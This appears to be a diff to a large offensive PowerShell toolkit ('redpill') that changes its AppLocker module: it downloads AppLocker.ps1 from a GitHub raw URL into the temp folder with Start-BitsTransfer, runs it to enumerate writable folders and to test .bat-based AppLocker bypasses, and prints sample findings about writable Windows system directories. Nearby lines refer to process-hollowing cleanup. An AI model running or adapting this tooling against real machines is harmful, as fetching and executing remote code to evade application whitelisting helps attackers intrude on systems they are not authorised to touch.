@@ -1994,7 +1994,7 @@ If($PEHollow -ne "false"){
    If(Test-Path -Path "$Env:TMP\Start-Hollow.ps1"){Remove-Item -Path "$Env:TMP\Start-Hollow.ps1" -Force}
 }
 
-if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "TestBat" -or $AppLocker -Match '\\'){
+if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "TestBat" -or $AppLocker -Match '(.bat)$'){
 
    <#
    .SYNOPSIS
@@ -2049,7 +2049,7 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "Test
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 19){## Corrupted download detected => DefaultFileSize: 19,2783203125/KB
+      If($SizeDump -lt 20){## Corrupted download detected => DefaultFileSize: 20,0068359375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2062,14 +2062,14 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "Test
    }ElseIf($AppLocker -ieq "Enum"){
 
        If($StartDir -ne "$Env:USERPROFILE"){
-          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$StartDir"
+          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$StartDir" -Verb True
        }Else{
-          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$Env:WINDIR"
+          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$Env:WINDIR" -Verb True
        }
 
    }ElseIf($AppLocker -ieq "TestBat"){
        powershell -File "$Env:TMP\AppLocker.ps1" -TestBat TestBypass
-   }ElseIf($AppLocker -Match '\\'){
+   }ElseIf($AppLocker -Match '(.bat)$'){
        powershell -File "$Env:TMP\AppLocker.ps1" -TestBat "$AppLocker"
    }
 
@@ -3886,11 +3886,13 @@ $HelpParameters = @"
       FolderPath        : C:\WINDOWS\tracing
       IdentityReference : BUILTIN\\Utilizadores
       FileSystemRights  : Write
+      IsInHerit?        : False
 
       VulnId            : 2::ACL (Mitre T1222)
       FolderPath        : C:\WINDOWS\System32\Microsoft\Crypto\RSA\MachineKeys
       IdentityReference : BUILTIN\\Utilizadores
       FileSystemRights  : Write
+      IsInHerit?        : True
    #>!bye..
 
 "@;
